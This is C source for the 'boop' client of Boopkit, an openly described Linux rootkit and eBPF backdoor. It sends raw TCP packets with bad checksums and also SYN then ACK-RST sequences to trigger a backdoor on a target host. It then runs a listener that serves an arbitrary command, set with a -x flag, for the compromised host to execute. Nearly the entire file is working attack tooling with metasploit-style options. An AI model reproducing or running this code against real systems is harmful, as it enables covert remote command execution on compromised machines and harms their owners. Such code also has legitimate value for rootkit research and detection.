// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <stdbool.h>
#include <linux/types.h>


// clang-format off
#include "../boopkit.h"
#include "tcp.h"
// clang-format on



void usage() {
  printf("Boopkit version: %s\n", VERSION);
  printf("Linux rootkit and backdoor over eBPF.\n");
  printf("Author: Kris Nóva <kris@nivenly.com>\n");
  printf("\n");
  printf("Usage: boopkit-boop [options]\n");
  printf("\n");
  printf("Options:\n");
  printf("-lhost             Local  (src) address: 127.0.0.1.\n");
  printf("-lport             Local  (src) port:    3535\n");
  printf("-rhost             Remote (dst) address: 127.0.0.1.\n");
  printf("-rport             Remote (dst) port:    22\n");
  printf("-x, execute        Command to execute on the remote server: ls -la\n");
  printf("-h, help           Display help and usage for boopkit.\n");
  printf("\n");
  exit(0);
}



// config is the configuration options for the program
struct config {
  // metasploit inspired flags
  char rhost[INET_ADDRSTRLEN];
  char rport[MAX_PORT_STR];
  char lhost[INET_ADDRSTRLEN];
  char lport[MAX_PORT_STR];
  char rce[MAX_RCE_SIZE];
} cfg;

// clisetup will initialize the config struct for the program
void clisetup(int argc, char **argv) {
  // Default values
  strncpy(cfg.lhost, "127.0.0.1", INET_ADDRSTRLEN);
  sprintf(cfg.lport, "%d", PORT);
  strncpy(cfg.rhost, "127.0.0.1", INET_ADDRSTRLEN);
  strncpy(cfg.rport, "22", MAX_PORT_STR);
  strncpy(cfg.rce, "ls -la", MAX_RCE_SIZE);
  for (int i = 0; i < argc; i++) {
    if (strncmp(argv[i], "-lport", 32) == 0 && argc >= i + 1){
      strncpy(cfg.lport, argv[i + 1], MAX_PORT_STR);
    }
    if (strncmp(argv[i], "-rport", 32) == 0 && argc >= i + 1){
      strncpy(cfg.rport, argv[i + 1], MAX_PORT_STR);
    }
    if (strncmp(argv[i], "-lhost", INET_ADDRSTRLEN) == 0 && argc >= i + 1){
      strncpy(cfg.lhost, argv[i + 1], MAX_PORT_STR);
    }
    if (strncmp(argv[i], "-rhost", INET_ADDRSTRLEN) == 0 && argc >= i + 1){
      strncpy(cfg.rhost, argv[i + 1], MAX_PORT_STR);
    }
    if (argv[i][0] == '-') {
      switch (argv[i][1]) {
      case 'h':
        usage();
        break;
      case 'x':
        strncpy(cfg.rce, argv[i + 1], MAX_RCE_SIZE);
        break;
      }
    }
  }
}

void rootcheck(int argc, char **argv) {
  long luid = (long)getuid();
  if (luid != 0) {
    printf("  XX Invalid UID.\n");
    printf("  XX Permission denied.\n");
    exit(1);
  }
}

int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
  struct sockaddr_in laddr;
  int one = 1;
  const int *oneval = &one;
  laddr.sin_family = AF_INET;
  laddr.sin_port = htons(PORT);
  if (inet_pton(AF_INET, listenstr, &laddr.sin_addr) != 1) {
    printf(" XX Listen IP configuration failed.\n");
    return 1;
  }
  int servesock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (servesock == -1) {
    printf(" XX Socket creation failed\n");
    return 1;
  }
  if (setsockopt(servesock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, oneval,
                 sizeof oneval)) {
    printf(" XX Socket option SO_REUSEADDR | SO_REUSEPORT failed\n");
    return 1;
  }
  if (bind(servesock, (struct sockaddr *)&laddr, sizeof laddr) < 0) {
    printf(" XX Socket bind failure: %s\n", listenstr);
    return 1;
  }
  printf("LISTEN   [serving exec] <- %s:%s\n", cfg.lhost, cfg.lport);
  //printf("Listening for Boopkit response...\n");
  // n=1 is the number of clients to accept before we begin refusing clients!
  if (listen(servesock, 1) < 0) {
    printf(" XX Socket listen failure: %s\n", listenstr);
    return 1;
  }
  int clientsock;
  int addrlen = sizeof laddr;
  if ((clientsock = accept(servesock, (struct sockaddr*)&laddr, (socklen_t*)&addrlen)) < 0 ) {
    printf(" XX Socket accept failure: %s\n", listenstr);
    return 1;
  }
  send(clientsock, rce, MAX_RCE_SIZE, 0);
  return 0;
}

// [trigger] <source-ip> <target-ip> <target-port>
//
// My research shows that with Linux 5.17 kernels
// the port doesn't matter to trigger a boop bad checksum
// event in a target kernel.
//
// However, because boopkit needs additional ways to boop a target
// we accept a port value here, as we try multiple boops against
// a boop!
//
int main(int argc, char **argv) {
  int one = 1;
  const int *oneval = &one;
  asciiheader();
  rootcheck(argc, argv);
  clisetup(argc, argv);
  srand(time(NULL));
  printf("RHOST    [%s]\n", cfg.rhost);
  printf("RPORT    [%s]\n", cfg.rport);
  printf("LHOST    [%s]\n", cfg.lhost);
  printf("LPORT    [%s]\n", cfg.lport);
  printf("RCE EXEC [%s]\n", cfg.rce);


  // [Destination]
  // Configure daddr fields sin_port, sin_addr, sin_family
  struct sockaddr_in daddr;
  daddr.sin_family = AF_INET;
  daddr.sin_port = htons(atoi(cfg.rport));
  if (inet_pton(AF_INET, cfg.rhost, &daddr.sin_addr) != 1) {
    printf("Destination IP configuration failed\n");
    return 1;
  }

  // [Source]
  // Configure saddr fields, sin_port, sin_addr, sin_family
  struct sockaddr_in saddr;
  saddr.sin_family = AF_INET;
  saddr.sin_port = htons(rand() % 65535);  // random client port
  if (inet_pton(AF_INET, cfg.lhost, &saddr.sin_addr) != 1) {
    printf("Source IP configuration failed\n");
    return 1;
  }

  // Validate members to stdout
  char daddrstr[INET_ADDRSTRLEN];
  char saddrstr[INET_ADDRSTRLEN];
  inet_ntop(AF_INET, &daddr.sin_addr, daddrstr, sizeof daddrstr);
  inet_ntop(AF_INET, &saddr.sin_addr, saddrstr, sizeof saddrstr);

  //

  // ===========================================================================
  // 1. Bad checksum SYN SOCK_RAW (Connectionless)
  //
  // Send a bad TCP checksum packet to any TCP socket. Regardless if a server
  // is running. The kernel will still trigger a bad TCP checksum event.
  //
  // Note: This is a connectionless SYN packet over SOCK_RAW which allows us to
  // do our dirty work.
  //
  // [Socket] SOCK_RAW Reliably-delivered messages.
  // TODO: @kris-nova experiment with SOCK_DGRAM for connectionless datagrams
  // of unfixed length!
  int sock1 = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (sock1 == -1) {
    printf("Socket SOCK_RAW creation failed\n");
    return 1;
  }
  // [Socket] IP_HDRINCL Header Include
  if (setsockopt(sock1, IPPROTO_IP, IP_HDRINCL, oneval, sizeof(one)) == -1) {
    printf("Unable to set socket option [IP_HDRINCL]\n");
    return 1;
  }
  // [SYN] Send a packet with a 0 checksum!
  char *packet;
  int packet_len;
  // TODO: @kris-nova We should spam a few bad checksum ports! We know we can
  // send to any TCP port on the server!
  create_bad_syn_packet(&saddr, &daddr, &packet, &packet_len);
  int sent;
  if ((sent = sendto(sock1, packet, packet_len, 0, (struct sockaddr *)&daddr,
                     sizeof(struct sockaddr))) == -1) {
    printf("Unable to send bad checksum SYN packet over SOCK_RAW.\n");
    return 2;
  }
  printf("SYN      [bad checksum] -> %s:%s %d bytes\n", cfg.rhost, cfg.rport, sent);
  close(sock1);
  // ===========================================================================

  // ===========================================================================
  // 2. TCP SOCK_STREAM Connection
  //
  // Here we have a connection based socket. This connection is not required
  // for a "boop". However, we use this to validate we can truly communicate
  // with the backend server. A failure to configure a SOCK_STREAM socket
  // against a boop, can indicate we aren't just firing into the abyss.
  //
  // [Socket] SOCK_STREAM Sequenced, reliable, connection-based byte streams.
  int sock2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (sock2 == -1) {
    printf("Socket creation failed\n");
    return 1;
  }
  if (connect(sock2, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
    printf("Connection SOCK_STREAM refused.\n");
    return 2;
  }
  printf("CONNECT  [    okay    ] -> %s:%s\n", cfg.rhost, cfg.rport);
  close(sock2);
  // ===========================================================================


  // ===========================================================================
  // 3. TCP Reset SOCK_RAW
  //
  // This is the 3rd mechanism we use to boop a server.
  // Here we complete a TCP handshake, however we also flip the RST header bit
  // in the hopes of trigger a TCP reset via a boop TCP service.
  //
  // The first bad checksum approach will fail blindly due to the nature of raw
  // sockets. This is a much more reliable boop, however it comes with more
  // risk as it boops through an application.
  //
  // [Socket] SOCK_STREAM Sequenced, reliable, connection-based byte streams.
  int sock3 = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (sock3 == -1) {
    printf("Socket SOCK_RAW creation failed\n");
    return 1;
  }
  // [Socket] IP_HDRINCL Header Include
  if (setsockopt(sock3, IPPROTO_IP, IP_HDRINCL, oneval, sizeof(one)) == -1) {
    printf("Unable to set socket option [IP_HDRINCL]\n");
    return 1;
  }
  create_syn_packet(&saddr, &daddr, &packet, &packet_len);
  if ((sent = sendto(sock3, packet, packet_len, 0, (struct sockaddr *)&daddr,
                     sizeof(struct sockaddr))) == -1) {
    printf("Unable to send RST over SOCK_STREAM.\n");
    return 2;
  }
  printf("SYN      [    okay    ] -> %d bytes to %s:%s\n", sent, cfg.rhost,
         cfg.rport);
  char recvbuf[DATAGRAM_LEN];
  int received = receive_from(sock3, recvbuf, sizeof(recvbuf), &saddr);
  if (received <= 0) {
    printf("Unable to receive SYN-ACK over SOCK_STREAM.\n");
    return 3;
  }
  printf("SYN-ACK  [    okay    ] <- %d bytes from %s\n", received, cfg.rhost);
  uint32_t seq_num, ack_num;
  read_seq_and_ack(recvbuf, &seq_num, &ack_num);
  int new_seq_num = seq_num + 1;
  create_ack_rst_packet(&saddr, &daddr, ack_num, new_seq_num, &packet,
                        &packet_len);
  if ((sent = sendto(sock3, packet, packet_len, 0, (struct sockaddr *)&daddr,
                     sizeof(struct sockaddr))) == -1) {
    printf("Unable to send ACK-RST over SOCK_STREAM.\n");
    return 2;
  }
  printf("ACK-RST  [    okay    ] -> %d bytes to %s:%s\n", sent, cfg.rhost,
         cfg.rport);
  close(sock3);
  // ===========================================================================

  int errno;
  errno = serverce(saddrstr, cfg.rce);
  if (errno != 0) {
    printf(" Error serving RCE!\n");
  }
  printf("EXEC  -> [%s]\n", cfg.rce);
  return 0;
}
